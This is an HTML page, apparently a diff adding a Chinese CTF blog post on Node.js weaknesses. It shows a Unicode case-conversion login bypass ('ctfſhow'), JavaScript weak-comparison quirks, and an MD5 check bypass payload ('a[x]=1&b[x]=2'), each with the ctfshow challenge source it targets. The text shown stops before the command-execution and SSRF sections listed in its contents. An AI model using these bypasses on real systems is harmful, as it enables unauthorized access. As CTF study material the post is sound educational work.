@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>nodejs - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/ctf/nodejs/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="nodejs">
+  <meta property="og:description" content="前言：非常感谢F1veseven师傅的博客分享，本篇文章是在师傅分享的基础上，希望总结出一篇更全的姿式库供以后的比赛使用。
+nnodejs语言的缺点 大小写特性 toUpperCase()toLowerCase()对于toUpperCase(): 字符`&#34;ı&#34;`、`&#34;ſ&#34;` 经过toUpperCase处理后结果为 `&#34;I&#34;`、`&#34;S&#34;`对于toLowerCase(): 字符`&#34;K&#34;`经过toLowerCase处理后结果为`&#34;k&#34;`(这个K不是K) 例题：ctfshow 334 打开题目是一个登录界面，阅读源码，这里贴出关键代码
+module.exports = { items: [ {username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;} ] }; var findUser = function(name, password){ return users.find(function(item){ return name!==&#39;CTFSHOW&#39; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; }); }; 这题感觉题面有问题，考点没考到，输入小写的ctfshow和123456即可登录获得flag。
+将题面改成这样又该如何绕过呢？
+return name!==&#39;ctfshow&#39; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; js中有大小写特性
+这题刚好用到了类s字符，输入 ctfſhow/123456。成功登录
+弱类型比较 大小比较
+console.log(1==&#39;1&#39;); //true console.log(1&gt;&#39;2&#39;); //false console.log(&#39;1&#39;&lt;&#39;2&#39;); //true console.log(111&gt;&#39;3&#39;); //true console.log(&#39;111&#39;&gt;&#39;3&#39;); //false console.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T23:51:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T23:51:36+08:00">
+    <meta property="article:tag" content="Nodejs">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="nodejs">
+  <meta name="twitter:description" content="前言：非常感谢F1veseven师傅的博客分享，本篇文章是在师傅分享的基础上，希望总结出一篇更全的姿式库供以后的比赛使用。
+nnodejs语言的缺点 大小写特性 toUpperCase()toLowerCase()对于toUpperCase(): 字符`&#34;ı&#34;`、`&#34;ſ&#34;` 经过toUpperCase处理后结果为 `&#34;I&#34;`、`&#34;S&#34;`对于toLowerCase(): 字符`&#34;K&#34;`经过toLowerCase处理后结果为`&#34;k&#34;`(这个K不是K) 例题：ctfshow 334 打开题目是一个登录界面，阅读源码，这里贴出关键代码
+module.exports = { items: [ {username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;} ] }; var findUser = function(name, password){ return users.find(function(item){ return name!==&#39;CTFSHOW&#39; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; }); }; 这题感觉题面有问题，考点没考到，输入小写的ctfshow和123456即可登录获得flag。
+将题面改成这样又该如何绕过呢？
+return name!==&#39;ctfshow&#39; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; js中有大小写特性
+这题刚好用到了类s字符，输入 ctfſhow/123456。成功登录
+弱类型比较 大小比较
+console.log(1==&#39;1&#39;); //true console.log(1&gt;&#39;2&#39;); //false console.log(&#39;1&#39;&lt;&#39;2&#39;); //true console.log(111&gt;&#39;3&#39;); //true console.log(&#39;111&#39;&gt;&#39;3&#39;); //false console.">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/ctf/nodejs/" /><link rel="prev" href="https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/" /><link rel="next" href="https://thnpkm.github.io/posts/ctf/newstarctf-web/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "nodejs",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/ctf\/nodejs\/"
+        },"genre": "posts","keywords": "nodejs","wordcount":  991 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/ctf\/nodejs\/","datePublished": "2024-08-20T23:51:36+08:00","dateModified": "2024-08-20T23:51:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">nodejs</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;991 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#大小写特性">大小写特性</a>
+      <ul>
+        <li><a href="#例题ctfshow-334">例题：ctfshow 334</a></li>
+      </ul>
+    </li>
+    <li><a href="#弱类型比较">弱类型比较</a></li>
+    <li><a href="#md5的绕过">MD5的绕过</a>
+      <ul>
+        <li><a href="#ctfshow-web337">ctfshow web337</a></li>
+      </ul>
+    </li>
+    <li><a href="#编码绕过">编码绕过</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#nodejs危险函数-命令执行">nodejs危险函数-命令执行</a>
+      <ul>
+        <li><a href="#例题ctfshow-web335">例题：ctfshow-web335</a></li>
+      </ul>
+    </li>
+    <li><a href="#nodejs危险函数-文件读写">nodejs危险函数-文件读写</a></li>
+    <li><a href="#nodejs危险函数-rce-bypass">nodejs危险函数-RCE bypass</a>
+      <ul>
+        <li><a href="#例题--ctfshow-web336">例题  ctfshow web336</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#通过拆分请求实现的ssrf攻击">通过拆分请求实现的ssrf攻击</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>前言：非常感谢F1veseven师傅的博客分享，本篇文章是在师傅分享的基础上，希望总结出一篇更全的姿式库供以后的比赛使用。</p>
+<h1 id="nnodejs语言的缺点">nnodejs语言的缺点</h1>
+<h2 id="大小写特性">大小写特性</h2>
+<pre tabindex="0"><code>toUpperCase()
+toLowerCase()
+
+对于toUpperCase(): 字符`&#34;ı&#34;`、`&#34;ſ&#34;` 经过toUpperCase处理后结果为 `&#34;I&#34;`、`&#34;S&#34;`
+对于toLowerCase(): 字符`&#34;K&#34;`经过toLowerCase处理后结果为`&#34;k&#34;`(这个K不是K)
+</code></pre><h3 id="例题ctfshow-334">例题：ctfshow 334</h3>
+<p>打开题目是一个登录界面，阅读源码，这里贴出关键代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">items</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>    {<span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;CTFSHOW&#39;</span>, <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;123456&#39;</span>}
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">findUser</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">name</span>, <span style="color:#a6e22e">password</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">users</span>.<span style="color:#a6e22e">find</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">item</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">!==</span><span style="color:#e6db74">&#39;CTFSHOW&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">item</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">toUpperCase</span>() <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">item</span>.<span style="color:#a6e22e">password</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">password</span>;
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>这题感觉题面有问题，考点没考到，输入小写的ctfshow和123456即可登录获得flag。</p>
+<p>将题面改成这样又该如何绕过呢？</p>
+<pre tabindex="0"><code> return name!==&#39;ctfshow&#39; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;
+</code></pre><p>js中有大小写特性</p>
+<p>这题刚好用到了类s字符，输入  ctfſhow/123456。成功登录</p>
+<h2 id="弱类型比较">弱类型比较</h2>
+<p><strong>大小比较</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;1&#39;</span>); <span style="color:#75715e">//true 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span><span style="color:#e6db74">&#39;2&#39;</span>); <span style="color:#75715e">//false 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">&#39;2&#39;</span>); <span style="color:#75715e">//true 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#ae81ff">111</span><span style="color:#f92672">&gt;</span><span style="color:#e6db74">&#39;3&#39;</span>); <span style="color:#75715e">//true 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;111&#39;</span><span style="color:#f92672">&gt;</span><span style="color:#e6db74">&#39;3&#39;</span>); <span style="color:#75715e">//false 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;asd&#39;</span><span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1</span>); <span style="color:#75715e">//false
+</span></span></span></code></pre></div><p>总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false</p>
+<p><em><strong>数组的比较：</strong></em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>([]<span style="color:#f92672">==</span>[]); <span style="color:#75715e">//false 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>([]<span style="color:#f92672">&gt;</span>[]); <span style="color:#75715e">//false
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>([<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">2</span>]<span style="color:#f92672">&gt;</span>[<span style="color:#ae81ff">5</span>]); <span style="color:#75715e">//true 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>([<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">2</span>]<span style="color:#f92672">&lt;</span><span style="color:#e6db74">&#39;test&#39;</span>); <span style="color:#75715e">//true 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>([<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>]<span style="color:#f92672">&lt;</span><span style="color:#e6db74">&#39;2&#39;</span>);  <span style="color:#75715e">//true 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>([<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">16</span>]<span style="color:#f92672">&lt;</span><span style="color:#e6db74">&#34;10&#34;</span>); <span style="color:#75715e">//false
+</span></span></span></code></pre></div><p>总结：空数组之间比较永远为false，数组之间比较只比较数组间的第一个值，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，数组永远小于非数值型字符串；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较</p>
+<p><em>还有一些比较特别的相等：</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">null</span><span style="color:#f92672">==</span><span style="color:#66d9ef">undefined</span>) <span style="color:#75715e">// 输出：true 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">null</span><span style="color:#f92672">===</span><span style="color:#66d9ef">undefined</span>) <span style="color:#75715e">// 输出：false 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">NaN</span><span style="color:#f92672">==</span><span style="color:#66d9ef">NaN</span>)  <span style="color:#75715e">// 输出：false 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">NaN</span><span style="color:#f92672">===</span><span style="color:#66d9ef">NaN</span>)  <span style="color:#75715e">// 输出：false
+</span></span></span></code></pre></div><p><strong>变量拼接</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#ae81ff">5</span><span style="color:#f92672">+</span>[<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">6</span>]); <span style="color:#75715e">//56,3 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>); <span style="color:#75715e">//56 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">+</span>[<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">6</span>]); <span style="color:#75715e">//56,6 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">+</span>[<span style="color:#e6db74">&#34;6&#34;</span>,<span style="color:#e6db74">&#34;6&#34;</span>]); <span style="color:#75715e">//56,6
+</span></span></span></code></pre></div><h2 id="md5的绕过">MD5的绕过</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">a</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">length</span><span style="color:#f92672">===</span><span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">!==</span><span style="color:#a6e22e">b</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">a</span><span style="color:#f92672">+</span><span style="color:#a6e22e">flag</span>)<span style="color:#f92672">===</span><span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">b</span><span style="color:#f92672">+</span><span style="color:#a6e22e">flag</span>)
+</span></span></code></pre></div><p>a[x]=1&amp;b[x]=2</p>
+<p>数组会被解析成<code>[object Object]</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">a</span><span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;1&#39;</span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">b</span><span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;2&#39;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">a</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;flag{xxx}&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">b</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;flag{xxx}&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">a</span><span style="color:#f92672">=</span>[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">b</span><span style="color:#f92672">=</span>[<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">a</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;flag{xxx}&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">b</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;flag{xxx}&#34;</span>)
+</span></span></code></pre></div><h3 id="ctfshow-web337">ctfshow web337</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">router</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">Router</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">s</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createHash</span>(<span style="color:#e6db74">&#39;md5&#39;</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">s</span>)
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">digest</span>(<span style="color:#e6db74">&#39;hex&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GET home page. */</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;html&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flag</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;xxxxxxx&#39;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">a</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">b</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">a</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">length</span><span style="color:#f92672">===</span><span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">!==</span><span style="color:#a6e22e">b</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">a</span><span style="color:#f92672">+</span><span style="color:#a6e22e">flag</span>)<span style="color:#f92672">===</span><span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">b</span><span style="color:#f92672">+</span><span style="color:#a6e22e">flag</span>)){
+</span></span><span style="display:flex;"><span>  	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">flag</span>);
+</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>  	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>,{ <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;tql&#39;</span>});
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">router</span>;
+</span></span></code></pre></div><p>md5绕过</p>
